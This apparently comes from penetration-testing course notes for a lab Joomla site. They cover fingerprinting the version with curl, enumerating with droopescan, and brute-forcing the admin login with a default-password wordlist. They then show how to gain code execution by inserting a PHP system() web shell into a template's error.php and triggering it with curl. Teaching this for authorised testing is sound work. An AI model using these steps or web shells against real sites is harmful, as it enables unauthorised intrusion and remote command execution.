# Discovery/Footprinting
```bash
$ curl -s http://dev.inlanefreight.local/ | grep Joomla
$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

# Enumeration
```bash
$ sudo pip3 install droopescan
$ droopescan scan joomla --url http://dev.inlanefreight.local/
```

The default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.

```bash
$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

# Attacking Joomla
## Abusing Built-In Functionality
Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.

From here, we can click on Templates on the bottom left under Configuration to pull up the templates menu.

Next, we can click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page.

Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.

Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows.

system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

Once this is in, click on Save & Close at the top and confirm code execution using cURL.

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id